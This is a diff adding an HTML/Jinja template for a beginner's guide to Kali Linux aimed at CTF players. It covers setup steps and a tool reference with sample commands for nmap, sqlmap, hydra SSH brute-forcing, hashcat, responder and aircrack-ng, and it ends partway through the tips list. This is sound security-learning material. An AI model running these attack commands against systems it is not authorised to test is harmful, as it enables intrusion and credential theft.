@@ -1,0 +1,616 @@
+{% extends "base.html" %}
+
+{% block stylesheets %}
+{{ super() }}
+<style>
+:root, [data-bs-theme="light"] {
+  --k-bg-page:      #f3f4f6;
+  --k-bg-surface:   #ffffff;
+  --k-bg-elevated:  #f8f9fa;
+  --k-bg-code:      #f1f5f9;
+  --k-text:         #111827;
+  --k-text-muted:   #6b7280;
+  --k-border:       #d1d5db;
+  --k-accent:       #557C93;
+  --k-accent-rgb:   85,124,147;
+  --k-blue:         #2563eb;
+  --k-green:        #059669;
+  --k-red:          #dc2626;
+  --k-purple:       #7c3aed;
+  --k-orange:       #d97706;
+  --k-radius:       .55rem;
+  --k-radius-lg:    .85rem;
+}
+[data-bs-theme="dark"] {
+  --k-bg-page:      #0d1117;
+  --k-bg-surface:   #161b22;
+  --k-bg-elevated:  #1c2333;
+  --k-bg-code:      #1a1f2e;
+  --k-text:         #e6edf3;
+  --k-text-muted:   #8b949e;
+  --k-border:       #30363d;
+  --k-accent:       #78b4d0;
+  --k-accent-rgb:   120,180,208;
+  --k-blue:         #58a6ff;
+  --k-green:        #3fb950;
+  --k-red:          #f85149;
+  --k-purple:       #bc8cff;
+  --k-orange:       #d29922;
+}
+
+body { background: var(--k-bg-page); }
+
+/* ── Hero ───────────────────────────────── */
+.k-hero {
+  background: linear-gradient(135deg, rgba(var(--k-accent-rgb),.14) 0%, rgba(var(--k-accent-rgb),.04) 100%);
+  border-bottom: 1px solid var(--k-border);
+  padding: 3rem 0 2.5rem;
+  text-align: center;
+}
+.k-hero-icon { font-size: 2.8rem; color: var(--k-accent); margin-bottom: .6rem; }
+.k-hero-title { font-size: 2rem; font-weight: 800; color: var(--k-text); letter-spacing: -.02em; }
+.k-hero-sub { color: var(--k-text-muted); font-size: 1rem; margin-top: .4rem; max-width: 640px; margin-left: auto; margin-right: auto; line-height: 1.6; }
+
+/* ── Layout ─────────────────────────────── */
+.k-wrap { max-width: 1000px; margin: 0 auto; padding: 2rem 1rem 4rem; }
+
+.k-toc {
+  background: var(--k-bg-surface); border: 1px solid var(--k-border);
+  border-radius: var(--k-radius-lg); padding: 1.25rem 1.5rem; margin-bottom: 2rem;
+}
+.k-toc-title { font-size: .72rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; color: var(--k-text-muted); margin-bottom: .6rem; }
+.k-toc-list { list-style: none; padding: 0; margin: 0; display: flex; flex-wrap: wrap; gap: .5rem; }
+.k-toc-list a {
+  display: inline-flex; align-items: center; gap: .3rem;
+  padding: .35rem .75rem; border-radius: 99px; font-size: .8rem; font-weight: 600;
+  background: rgba(var(--k-accent-rgb),.08); color: var(--k-accent);
+  text-decoration: none; transition: background .15s;
+}
+.k-toc-list a:hover { background: rgba(var(--k-accent-rgb),.16); }
+
+/* ── Sections ───────────────────────────── */
+.k-section { margin-bottom: 2.5rem; }
+.k-section-title {
+  font-size: 1.3rem; font-weight: 800; color: var(--k-text); margin-bottom: 1rem;
+  display: flex; align-items: center; gap: .5rem;
+  padding-bottom: .5rem; border-bottom: 2px solid rgba(var(--k-accent-rgb),.2);
+}
+.k-section-title i { color: var(--k-accent); font-size: 1rem; }
+
+/* ── Card ───────────────────────────────── */
+.k-card {
+  background: var(--k-bg-surface); border: 1px solid var(--k-border);
+  border-radius: var(--k-radius-lg); padding: 1.5rem; margin-bottom: 1rem;
+}
+.k-card p { color: var(--k-text); font-size: .9rem; line-height: 1.7; margin: 0; }
+.k-card p + p { margin-top: .8rem; }
+
+/* ── Steps ──────────────────────────────── */
+.k-steps { display: flex; flex-direction: column; gap: 1rem; }
+.k-step {
+  background: var(--k-bg-surface); border: 1px solid var(--k-border);
+  border-radius: var(--k-radius-lg); padding: 1.25rem 1.5rem;
+  display: flex; gap: 1rem; align-items: flex-start;
+}
+.k-step-num {
+  flex-shrink: 0; width: 2rem; height: 2rem; border-radius: 50%;
+  background: var(--k-accent); color: #fff; font-size: .85rem; font-weight: 700;
+  display: flex; align-items: center; justify-content: center;
+}
+.k-step-body { flex: 1; min-width: 0; }
+.k-step-title { font-size: .95rem; font-weight: 700; color: var(--k-text); margin-bottom: .3rem; }
+.k-step-desc { font-size: .85rem; color: var(--k-text-muted); line-height: 1.6; }
+.k-step-desc code {
+  background: var(--k-bg-code); padding: .15rem .4rem; border-radius: 4px;
+  font-size: .8rem; font-family: 'SF Mono', Monaco, Consolas, monospace;
+  color: var(--k-accent);
+}
+
+/* ── Download cards ─────────────────────── */
+.k-dl-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 1rem; }
+.k-dl-card {
+  background: var(--k-bg-surface); border: 1px solid var(--k-border);
+  border-radius: var(--k-radius-lg); padding: 1.25rem; text-align: center;
+  transition: border-color .15s, box-shadow .15s; text-decoration: none; color: inherit;
+  display: flex; flex-direction: column; align-items: center; gap: .4rem;
+}
+.k-dl-card:hover { border-color: rgba(var(--k-accent-rgb),.5); box-shadow: 0 4px 16px rgba(var(--k-accent-rgb),.08); text-decoration: none; color: inherit; }
+.k-dl-icon { font-size: 1.5rem; color: var(--k-accent); }
+.k-dl-name { font-size: .9rem; font-weight: 700; color: var(--k-text); }
+.k-dl-desc { font-size: .78rem; color: var(--k-text-muted); }
+
+/* ── Tool table ─────────────────────────── */
+.k-tool-grid { display: flex; flex-direction: column; gap: .75rem; }
+.k-tool {
+  background: var(--k-bg-surface); border: 1px solid var(--k-border);
+  border-radius: var(--k-radius-lg); padding: 1rem 1.25rem;
+  display: flex; align-items: flex-start; gap: 1rem;
+}
+.k-tool-icon {
+  flex-shrink: 0; width: 2.4rem; height: 2.4rem; border-radius: var(--k-radius);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 1rem; color: #fff;
+}
+.k-tool-icon--recon { background: var(--k-blue); }
+.k-tool-icon--exploit { background: var(--k-red); }
+.k-tool-icon--web { background: var(--k-orange); }
+.k-tool-icon--password { background: var(--k-purple); }
+.k-tool-icon--wireless { background: var(--k-green); }
+.k-tool-icon--forensic { background: #64748b; }
+.k-tool-icon--reverse { background: #be185d; }
+.k-tool-icon--sniff { background: #0891b2; }
+.k-tool-info { flex: 1; min-width: 0; }
+.k-tool-name { font-size: .88rem; font-weight: 700; color: var(--k-text); }
+.k-tool-cat {
+  font-size: .62rem; font-weight: 700; text-transform: uppercase; letter-spacing: .8px;
+  padding: .1rem .4rem; border-radius: 99px; margin-left: .4rem; vertical-align: middle;
+}
+.k-tool-cat--recon { background: rgba(37,99,235,.1); color: var(--k-blue); }
+.k-tool-cat--exploit { background: rgba(220,38,38,.1); color: var(--k-red); }
+.k-tool-cat--web { background: rgba(217,119,6,.1); color: var(--k-orange); }
+.k-tool-cat--password { background: rgba(124,58,237,.1); color: var(--k-purple); }
+.k-tool-cat--wireless { background: rgba(5,150,105,.1); color: var(--k-green); }
+.k-tool-cat--forensic { background: rgba(100,116,139,.1); color: #64748b; }
+.k-tool-cat--reverse { background: rgba(190,24,93,.1); color: #be185d; }
+.k-tool-cat--sniff { background: rgba(8,145,178,.1); color: #0891b2; }
+.k-tool-desc { font-size: .82rem; color: var(--k-text-muted); line-height: 1.55; margin-top: .2rem; }
+.k-tool-cmd { margin-top: .35rem; }
+.k-tool-cmd code {
+  background: var(--k-bg-code); padding: .2rem .5rem; border-radius: 4px;
+  font-size: .75rem; font-family: 'SF Mono', Monaco, Consolas, monospace; color: var(--k-accent);
+}
+
+/* ── Tip box ────────────────────────────── */
+.k-tip {
+  background: rgba(var(--k-accent-rgb),.06); border: 1px solid rgba(var(--k-accent-rgb),.18);
+  border-radius: var(--k-radius-lg); padding: 1rem 1.25rem; margin-top: 1rem;
+  display: flex; align-items: flex-start; gap: .6rem;
+}
+.k-tip i { color: var(--k-accent); margin-top: .15rem; }
+.k-tip-text { font-size: .85rem; color: var(--k-text); line-height: 1.6; }
+
+/* ── Responsive ─────────────────────────── */
+@media (max-width: 640px) {
+  .k-hero-title { font-size: 1.4rem; }
+  .k-section-title { font-size: 1.1rem; }
+  .k-step { flex-direction: column; gap: .6rem; }
+  .k-tool { flex-direction: column; gap: .6rem; }
+}
+</style>
+{% endblock %}
+
+{% block content %}
+<!-- Hero -->
+<div class="k-hero">
+  <div class="k-hero-icon"><i class="fab fa-linux"></i></div>
+  <div class="k-hero-title">Kali Linux</div>
+  <div class="k-hero-sub">The industry-standard penetration testing distribution. Everything you need to know to get started with Kali for CTF competitions and security research.</div>
+</div>
+
+<div class="k-wrap">
+
+  <!-- Table of Contents -->
+  <nav class="k-toc">
+    <div class="k-toc-title">On This Page</div>
+    <ul class="k-toc-list">
+      <li><a href="#what-is-kali"><i class="fas fa-info-circle"></i> What Is Kali</a></li>
+      <li><a href="#why-kali"><i class="fas fa-bullseye"></i> Why Use It</a></li>
+      <li><a href="#get-kali"><i class="fas fa-download"></i> Get Kali</a></li>
+      <li><a href="#first-steps"><i class="fas fa-shoe-prints"></i> First Steps</a></li>
+      <li><a href="#essential-tools"><i class="fas fa-toolbox"></i> Essential Tools</a></li>
+      <li><a href="#ctf-tips"><i class="fas fa-flag"></i> CTF Tips</a></li>
+    </ul>
+  </nav>
+
+  <!-- ─── What Is Kali ─────────────────────── -->
+  <section id="what-is-kali" class="k-section">
+    <h2 class="k-section-title"><i class="fas fa-info-circle"></i> What Is Kali Linux?</h2>
+    <div class="k-card">
+      <p><strong>Kali Linux</strong> is a Debian-based Linux distribution designed specifically for <strong>digital forensics</strong>, <strong>penetration testing</strong>, and <strong>security auditing</strong>. Maintained by <strong>Offensive Security</strong>, it comes pre-installed with over <strong>600 security tools</strong> covering every phase of an engagement — from reconnaissance and enumeration to exploitation, post-exploitation, and reporting.</p>
+      <p>First released in 2013 as the successor to <strong>BackTrack Linux</strong>, Kali has become the de facto standard operating system for security professionals, ethical hackers, and CTF competitors worldwide. It is <strong>free, open source</strong>, and receives continuous updates.</p>
+    </div>
+  </section>
+
+  <!-- ─── Why Kali ─────────────────────────── -->
+  <section id="why-kali" class="k-section">
+    <h2 class="k-section-title"><i class="fas fa-bullseye"></i> Why Use Kali Linux?</h2>
+    <div class="k-steps">
+      <div class="k-step">
+        <div class="k-step-num"><i class="fas fa-box-open" style="font-size:.7rem;"></i></div>
+        <div class="k-step-body">
+          <div class="k-step-title">600+ Pre-installed Tools</div>
+          <div class="k-step-desc">No need to manually install and configure individual tools. Kali bundles everything from <code>nmap</code> and <code>Burp Suite</code> to <code>Ghidra</code> and <code>John the Ripper</code> right out of the box.</div>
+        </div>
+      </div>
+      <div class="k-step">
+        <div class="k-step-num"><i class="fas fa-sync" style="font-size:.7rem;"></i></div>
+        <div class="k-step-body">
+          <div class="k-step-title">Rolling Release Model</div>
+          <div class="k-step-desc">Kali follows a rolling release cycle, meaning tools and packages are continuously updated. You always have access to the latest versions without waiting for a major release.</div>
+        </div>
+      </div>
+      <div class="k-step">
+        <div class="k-step-num"><i class="fas fa-laptop" style="font-size:.7rem;"></i></div>
+        <div class="k-step-body">
+          <div class="k-step-title">Runs Anywhere</div>
+          <div class="k-step-desc">Install it on bare metal, run it in a VM (VMware, VirtualBox, Hyper-V), boot from USB, use the Docker image, or run it on a Raspberry Pi, WSL2, or cloud instances.</div>
+        </div>
+      </div>
+      <div class="k-step">
+        <div class="k-step-num"><i class="fas fa-users" style="font-size:.7rem;"></i></div>
+        <div class="k-step-body">
+          <div class="k-step-title">Massive Community</div>
+          <div class="k-step-desc">Extensive documentation, forums, training courses (OSCP, OSCE, OSWE), and a huge community of users sharing scripts, configurations, and knowledge.</div>
+        </div>
+      </div>
+      <div class="k-step">
+        <div class="k-step-num"><i class="fas fa-flag" style="font-size:.7rem;"></i></div>
+        <div class="k-step-body">
+          <div class="k-step-title">CTF Ready</div>
+          <div class="k-step-desc">Most CTF writeups and walkthroughs assume a Kali environment. Having Kali means you can follow along with any guide without compatibility issues.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─── Get Kali ─────────────────────────── -->
+  <section id="get-kali" class="k-section">
+    <h2 class="k-section-title"><i class="fas fa-download"></i> Where to Get Kali</h2>
+    <div class="k-dl-grid">
+      <a href="https://www.kali.org/get-kali/#kali-installer-images" target="_blank" rel="noopener" class="k-dl-card">
+        <div class="k-dl-icon"><i class="fas fa-compact-disc"></i></div>
+        <div class="k-dl-name">Installer ISO</div>
+        <div class="k-dl-desc">Full installer for bare-metal or VM installation. 64-bit recommended.</div>
+      </a>
+      <a href="https://www.kali.org/get-kali/#kali-virtual-machines" target="_blank" rel="noopener" class="k-dl-card">
+        <div class="k-dl-icon"><i class="fas fa-desktop"></i></div>
+        <div class="k-dl-name">Pre-built VM</div>
+        <div class="k-dl-desc">Ready-to-use images for VMware and VirtualBox. Just import and go.</div>
+      </a>
+      <a href="https://www.kali.org/get-kali/#kali-arm" target="_blank" rel="noopener" class="k-dl-card">
+        <div class="k-dl-icon"><i class="fas fa-microchip"></i></div>
+        <div class="k-dl-name">ARM Images</div>
+        <div class="k-dl-desc">For Raspberry Pi, Pinebook, and other ARM-based devices.</div>
+      </a>
+      <a href="https://www.kali.org/docs/containers/using-kali-docker-images/" target="_blank" rel="noopener" class="k-dl-card">
+        <div class="k-dl-icon"><i class="fab fa-docker"></i></div>
+        <div class="k-dl-name">Docker</div>
+        <div class="k-dl-desc"><code style="font-size:.75rem;">docker pull kalilinux/kali-rolling</code></div>
+      </a>
+      <a href="https://www.kali.org/docs/wsl/wsl-preparations/" target="_blank" rel="noopener" class="k-dl-card">
+        <div class="k-dl-icon"><i class="fab fa-windows"></i></div>
+        <div class="k-dl-name">WSL2 (Windows)</div>
+        <div class="k-dl-desc">Run Kali natively inside Windows via the Microsoft Store.</div>
+      </a>
+      <a href="https://www.kali.org/get-kali/#kali-cloud" target="_blank" rel="noopener" class="k-dl-card">
+        <div class="k-dl-icon"><i class="fas fa-cloud"></i></div>
+        <div class="k-dl-name">Cloud (AWS / Azure)</div>
+        <div class="k-dl-desc">Deploy Kali in the cloud for remote engagements and on-demand labs.</div>
+      </a>
+    </div>
+    <div class="k-tip">
+      <i class="fas fa-lightbulb"></i>
+      <div class="k-tip-text"><strong>Recommendation for beginners:</strong> Download the <strong>Pre-built VM</strong> for VirtualBox. It's the fastest way to get started — no installation required. Just import the <code>.ova</code> file and boot up.</div>
+    </div>
+  </section>
+
+  <!-- ─── First Steps ──────────────────────── -->
+  <section id="first-steps" class="k-section">
+    <h2 class="k-section-title"><i class="fas fa-shoe-prints"></i> Getting Started — First Steps</h2>
+    <div class="k-steps">
+      <div class="k-step">
+        <div class="k-step-num">1</div>
+        <div class="k-step-body">
+          <div class="k-step-title">Update Everything</div>
+          <div class="k-step-desc">After first boot, always update your system:<br><code>sudo apt update && sudo apt full-upgrade -y</code></div>
+        </div>
+      </div>
+      <div class="k-step">
+        <div class="k-step-num">2</div>
+        <div class="k-step-body">
+          <div class="k-step-title">Change the Default Password</div>
+          <div class="k-step-desc">Default credentials are <code>kali:kali</code>. Change immediately:<br><code>passwd</code></div>
+        </div>
+      </div>
+      <div class="k-step">
+        <div class="k-step-num">3</div>
+        <div class="k-step-body">
+          <div class="k-step-title">Learn the Terminal</div>
+          <div class="k-step-desc">Most Kali tools are command-line based. Get comfortable with basic commands: <code>ls</code>, <code>cd</code>, <code>cat</code>, <code>grep</code>, <code>find</code>, <code>chmod</code>, <code>ssh</code>, pipes (<code>|</code>), and redirection (<code>&gt;</code>, <code>&gt;&gt;</code>).</div>
+        </div>
+      </div>
+      <div class="k-step">
+        <div class="k-step-num">4</div>
+        <div class="k-step-body">
+          <div class="k-step-title">Explore the Tool Menu</div>
+          <div class="k-step-desc">Kali organizes tools by category in the application menu. Browse through <strong>Information Gathering</strong>, <strong>Vulnerability Analysis</strong>, <strong>Web Application Analysis</strong>, <strong>Password Attacks</strong>, etc. to see what's available.</div>
+        </div>
+      </div>
+      <div class="k-step">
+        <div class="k-step-num">5</div>
+        <div class="k-step-body">
+          <div class="k-step-title">Set Up Your Workspace</div>
+          <div class="k-step-desc">Create a working directory for CTFs: <code>mkdir ~/ctf</code>. Keep challenge files organized per competition. Install any additional tools you like with <code>sudo apt install &lt;package&gt;</code>.</div>
+        </div>
+      </div>
+      <div class="k-step">
+        <div class="k-step-num">6</div>
+        <div class="k-step-body">
+          <div class="k-step-title">Take Snapshots</div>
+          <div class="k-step-desc">If using a VM, take a <strong>snapshot</strong> of your clean, updated Kali. You can always roll back if something breaks during testing.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─── Essential Tools ──────────────────── -->
+  <section id="essential-tools" class="k-section">
+    <h2 class="k-section-title"><i class="fas fa-toolbox"></i> Essential Tools Reference</h2>
+
+    <div class="k-tool-grid">
+
+      <!-- Recon -->
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--recon"><i class="fas fa-search"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Nmap <span class="k-tool-cat k-tool-cat--recon">Recon</span></div>
+          <div class="k-tool-desc">The gold standard for network scanning and port enumeration. Discovers open ports, running services, OS versions, and vulnerabilities.</div>
+          <div class="k-tool-cmd"><code>nmap -sC -sV -oN scan.txt &lt;target&gt;</code></div>
+        </div>
+      </div>
+
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--recon"><i class="fas fa-sitemap"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Gobuster <span class="k-tool-cat k-tool-cat--recon">Recon</span></div>
+          <div class="k-tool-desc">Brute-force directory and file discovery on web servers. Essential for finding hidden endpoints, admin panels, and backup files.</div>
+          <div class="k-tool-cmd"><code>gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt</code></div>
+        </div>
+      </div>
+
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--recon"><i class="fas fa-globe"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Amass <span class="k-tool-cat k-tool-cat--recon">Recon</span></div>
+          <div class="k-tool-desc">Subdomain enumeration and external asset discovery. Maps attack surfaces by finding subdomains through DNS, scraping, and APIs.</div>
+          <div class="k-tool-cmd"><code>amass enum -d example.com</code></div>
+        </div>
+      </div>
+
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--recon"><i class="fas fa-database"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">enum4linux <span class="k-tool-cat k-tool-cat--recon">Recon</span></div>
+          <div class="k-tool-desc">Enumerates SMB shares, users, groups, and policies on Windows/Samba systems. Essential for Active Directory recon.</div>
+          <div class="k-tool-cmd"><code>enum4linux -a &lt;target&gt;</code></div>
+        </div>
+      </div>
+
+      <!-- Web -->
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--web"><i class="fas fa-spider"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Burp Suite <span class="k-tool-cat k-tool-cat--web">Web</span></div>
+          <div class="k-tool-desc">The most widely used web application security testing platform. Intercepts and modifies HTTP traffic, crawls sites, and scans for vulnerabilities. The Community edition is included in Kali.</div>
+          <div class="k-tool-cmd"><code>burpsuite</code></div>
+        </div>
+      </div>
+
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--web"><i class="fas fa-bolt"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">SQLmap <span class="k-tool-cat k-tool-cat--web">Web</span></div>
+          <div class="k-tool-desc">Automates detection and exploitation of SQL injection flaws. Supports MySQL, PostgreSQL, Oracle, MSSQL, SQLite, and more. Dumps databases, reads files, and gains OS shell access.</div>
+          <div class="k-tool-cmd"><code>sqlmap -u "http://target/page?id=1" --dbs</code></div>
+        </div>
+      </div>
+
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--web"><i class="fas fa-crosshairs"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Nikto <span class="k-tool-cat k-tool-cat--web">Web</span></div>
+          <div class="k-tool-desc">Web server scanner that checks for dangerous files, outdated software, misconfigurations, and common vulnerabilities across 7,000+ tests.</div>
+          <div class="k-tool-cmd"><code>nikto -h http://target</code></div>
+        </div>
+      </div>
+
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--web"><i class="fas fa-code"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">WPScan <span class="k-tool-cat k-tool-cat--web">Web</span></div>
+          <div class="k-tool-desc">WordPress vulnerability scanner. Enumerates plugins, themes, users, and known CVEs specific to WordPress installations.</div>
+          <div class="k-tool-cmd"><code>wpscan --url http://target --enumerate vp,vt,u</code></div>
+        </div>
+      </div>
+
+      <!-- Exploitation -->
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--exploit"><i class="fas fa-bomb"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Metasploit Framework <span class="k-tool-cat k-tool-cat--exploit">Exploit</span></div>
+          <div class="k-tool-desc">The world's most widely used penetration testing framework. Contains thousands of exploits, payloads, encoders, and post-exploitation modules for every platform.</div>
+          <div class="k-tool-cmd"><code>msfconsole</code></div>
+        </div>
+      </div>
+
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--exploit"><i class="fas fa-terminal"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Searchsploit <span class="k-tool-cat k-tool-cat--exploit">Exploit</span></div>
+          <div class="k-tool-desc">Offline mirror of Exploit-DB. Quickly search for known exploits by software name, version, or CVE — no internet needed.</div>
+          <div class="k-tool-cmd"><code>searchsploit apache 2.4</code></div>
+        </div>
+      </div>
+
+      <!-- Password -->
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--password"><i class="fas fa-key"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">John the Ripper <span class="k-tool-cat k-tool-cat--password">Password</span></div>
+          <div class="k-tool-desc">Fast, versatile password cracker supporting hundreds of hash formats (MD5, SHA, NTLM, bcrypt, etc.). Great for cracking hashes found in CTF challenges.</div>
+          <div class="k-tool-cmd"><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></div>
+        </div>
+      </div>
+
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--password"><i class="fas fa-unlock"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Hashcat <span class="k-tool-cat k-tool-cat--password">Password</span></div>
+          <div class="k-tool-desc">GPU-accelerated password cracker. Supports rule-based attacks, mask attacks, and combination attacks. Significantly faster than CPU-based crackers on supported hardware.</div>
+          <div class="k-tool-cmd"><code>hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code></div>
+        </div>
+      </div>
+
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--password"><i class="fas fa-door-open"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Hydra <span class="k-tool-cat k-tool-cat--password">Password</span></div>
+          <div class="k-tool-desc">Online password brute-force tool. Attacks login pages over SSH, FTP, HTTP, SMB, RDP, and dozens of other protocols in parallel.</div>
+          <div class="k-tool-cmd"><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target</code></div>
+        </div>
+      </div>
+
+      <!-- Sniffing -->
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--sniff"><i class="fas fa-network-wired"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Wireshark <span class="k-tool-cat k-tool-cat--sniff">Network</span></div>
+          <div class="k-tool-desc">The world's foremost network protocol analyzer. Capture and inspect live traffic or analyze pcap files from forensics challenges. Supports 3,000+ protocols.</div>
+          <div class="k-tool-cmd"><code>wireshark</code></div>
+        </div>
+      </div>
+
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--sniff"><i class="fas fa-mask"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Responder <span class="k-tool-cat k-tool-cat--sniff">Network</span></div>
+          <div class="k-tool-desc">LLMNR/NBT-NS/MDNS poisoner and credential interceptor. Captures NTLMv2 hashes on the local network by answering broadcast name resolution queries.</div>
+          <div class="k-tool-cmd"><code>sudo responder -I eth0</code></div>
+        </div>
+      </div>
+
+      <!-- Wireless -->
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--wireless"><i class="fas fa-wifi"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Aircrack-ng <span class="k-tool-cat k-tool-cat--wireless">Wireless</span></div>
+          <div class="k-tool-desc">Complete suite for auditing wireless networks. Monitor, capture, and crack WEP/WPA/WPA2 handshakes. Includes airodump-ng, aireplay-ng, and related tools.</div>
+          <div class="k-tool-cmd"><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap</code></div>
+        </div>
+      </div>
+
+      <!-- Forensics -->
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--forensic"><i class="fas fa-microscope"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Volatility <span class="k-tool-cat k-tool-cat--forensic">Forensics</span></div>
+          <div class="k-tool-desc">Memory forensics framework. Analyze RAM dumps to extract processes, network connections, registry hives, passwords, and malware artifacts.</div>
+          <div class="k-tool-cmd"><code>vol.py -f memory.dmp --profile=Win7SP1x64 pslist</code></div>
+        </div>
+      </div>
+
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--forensic"><i class="fas fa-file-archive"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Binwalk <span class="k-tool-cat k-tool-cat--forensic">Forensics</span></div>
+          <div class="k-tool-desc">Firmware analysis tool that scans binary files for embedded files, file signatures, and compressed archives. Indispensable for steganography and forensics CTF challenges.</div>
+          <div class="k-tool-cmd"><code>binwalk -e suspicious_file.bin</code></div>
+        </div>
+      </div>
+
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--forensic"><i class="fas fa-image"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Steghide <span class="k-tool-cat k-tool-cat--forensic">Forensics</span></div>
+          <div class="k-tool-desc">Steganography tool for hiding and extracting data within JPEG and BMP images. Common in stego-themed CTF challenges.</div>
+          <div class="k-tool-cmd"><code>steghide extract -sf image.jpg</code></div>
+        </div>
+      </div>
+
+      <!-- Reverse Engineering -->
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--reverse"><i class="fas fa-cogs"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Ghidra <span class="k-tool-cat k-tool-cat--reverse">Reverse</span></div>
+          <div class="k-tool-desc">NSA's open-source reverse engineering suite. Decompiles binaries to C-like pseudocode. Supports x86, ARM, MIPS, and many more architectures. The free alternative to IDA Pro.</div>
+          <div class="k-tool-cmd"><code>ghidra</code></div>
+        </div>
+      </div>
+
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--reverse"><i class="fas fa-bug"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">GDB + pwndbg <span class="k-tool-cat k-tool-cat--reverse">Reverse</span></div>
+          <div class="k-tool-desc">GNU Debugger enhanced with pwndbg/GEF for exploit development. Set breakpoints, inspect memory, trace execution, and develop buffer overflow exploits.</div>
+          <div class="k-tool-cmd"><code>gdb -q ./binary</code></div>
+        </div>
+      </div>
+
+      <div class="k-tool">
+        <div class="k-tool-icon k-tool-icon--reverse"><i class="fas fa-file-code"></i></div>
+        <div class="k-tool-info">
+          <div class="k-tool-name">Radare2 <span class="k-tool-cat k-tool-cat--reverse">Reverse</span></div>
+          <div class="k-tool-desc">Advanced command-line reverse engineering framework. Disassembles, debugs, and patches binaries. Lightweight and scriptable.</div>
+          <div class="k-tool-cmd"><code>r2 -A ./binary</code></div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ─── CTF Tips ─────────────────────────── -->
+  <section id="ctf-tips" class="k-section">
+    <h2 class="k-section-title"><i class="fas fa-flag"></i> CTF Tips for Kali Users</h2>
+    <div class="k-steps">
+      <div class="k-step">
+        <div class="k-step-num"><i class="fas fa-book" style="font-size:.7rem;"></i></div>
+        <div class="k-step-body">
+          <div class="k-step-title">Unzip rockyou.txt</div>
+          <div class="k-step-desc">The famous password wordlist ships compressed. Unpack it before your first CTF:<br><code>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code></div>
+        </div>
+      </div>
+      <div class="k-step">
+        <div class="k-step-num"><i class="fas fa-plug" style="font-size:.7rem;"></i></div>
+        <div class="k-step-body">
+          <div class="k-step-title">Install pwntools</div>
+          <div class="k-step-desc">The go-to Python library for binary exploitation CTFs. Handles connections, packing, ROP chains, and shellcode generation:<br><code>pip install pwntools</code></div>
+        </div>
+      </div>
+      <div class="k-step">
+        <div class="k-step-num"><i class="fas fa-puzzle-piece" style="font-size:.7rem;"></i></div>
+        <div class="k-step-body">
+          <div class="k-step-title">Install CyberChef Locally</div>
+          <div class="k-step-desc">CyberChef is a web-based data analysis tool perfect for quick encoding/decoding, XOR, Base64, and hash lookups. Run it offline for CTFs with no internet.</div>
+        </div>
+      </div>
+      <div class="k-step">
+        <div class="k-step-num"><i class="fas fa-save" style="font-size:.7rem;"></i></div>
+        <div class="k-step-body">
+          <div class="k-step-title">Keep Notes</div>
+          <div class="k-step-desc">Use a tool like <strong>CherryTree</strong>, <strong>Obsidian</strong>, or simple markdown files to document your approach for each challenge. Good notes help during the CTF and when writing writeups afterwards.</div>
+        </div>
+      </div>
+      <div class="k-step">
+        <div class="k-step-num"><i class="fas fa-network-wired" style="font-size:.7rem;"></i></div>
+        <div class="k-step-body">
+          <div class="k-step-title">Network Your VM Properly</div>
+          <div class="k-step-desc">For CTFs that require VPN access (like HackTheBox or TryHackMe), make sure your Kali VM is set to <strong>NAT</strong> or <strong>Bridged</strong> networking, and import the <code>.ovpn</code> file with: <code>sudo openvpn ctf.ovpn</code></div>
+        </div>
+      </div>
+      <div class="k-step">
